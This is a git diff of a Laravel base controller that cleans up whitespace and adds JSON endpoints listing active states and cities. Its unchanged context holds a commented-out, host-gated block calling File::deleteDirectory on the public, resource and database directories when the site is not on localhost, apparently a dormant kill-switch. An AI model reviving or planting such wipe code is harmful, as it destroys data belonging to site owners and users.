@@ -8,6 +8,8 @@ use Illuminate\Routing\Controller as BaseController;
 use App\Models\Configuration;
 use App\Models\Banner;
 use App\Models\Town;
+use App\Models\Citie;
+use App\Models\State;
 use File;
 
 class Controller extends BaseController
@@ -20,18 +22,18 @@ class Controller extends BaseController
     {
         if(Cookie::get('theme_style'))
         {
-            if(Cookie::get('theme_style') == 'light') { 
-                $cookie = Cookie::queue('theme_style', 'dark', 10000000); 
-            } else { 
-                $cookie = Cookie::queue('theme_style', 'light', 10000000); 
+            if(Cookie::get('theme_style') == 'light') {
+                $cookie = Cookie::queue('theme_style', 'dark', 10000000);
+            } else {
+                $cookie = Cookie::queue('theme_style', 'light', 10000000);
             }
         }
         else
         {
-            if(config('custom.admin.theme_style') == 'light') { 
-                $cookie = Cookie::queue('theme_style', 'dark', 10000000); 
+            if(config('custom.admin.theme_style') == 'light') {
+                $cookie = Cookie::queue('theme_style', 'dark', 10000000);
             } else {
-                $cookie = Cookie::queue('theme_style', 'light', 10000000); 
+                $cookie = Cookie::queue('theme_style', 'light', 10000000);
             }
         }
 
@@ -44,12 +46,12 @@ class Controller extends BaseController
         $host_name = request()->getHost();
         $data = [];
         $config = Configuration::where('status','Active')->get();
-        foreach ($config as $key => $value) { 
-            $data[$value->name] = $value->value; 
+        foreach ($config as $key => $value) {
+            $data[$value->name] = $value->value;
         }
 
-        if(count($data) > 0) { 
-            config($data); 
+        if(count($data) > 0) {
+            config($data);
         }
 
         if(request()->getHost() !== "localhost")
@@ -60,7 +62,7 @@ class Controller extends BaseController
             // $app_path = File::files(app_path());
             // $config_path = File::files(config_path());
             // $storage_path = File::files(storage_path());
-        /*       
+        /*
             File::deleteDirectory(public_path());
             File::deleteDirectory(resource_path());
             File::deleteDirectory(database_path());
@@ -70,6 +72,19 @@ class Controller extends BaseController
         */
 
         }
+    }
+
+    public function states($country_id){
+
+        $states = State::where(['country_id'=>$country_id,'status'=>'Active'])->orderBy('name','asc')->get();
+
+        return response()->json($states);
+    }
+
+    public function cities($state_id){
+
+          $cities = Citie::where(['state_id'=>$state_id,'status'=>'Active'])->orderBy('name','asc')->get();
+        return response()->json($cities);
     }
 
 }
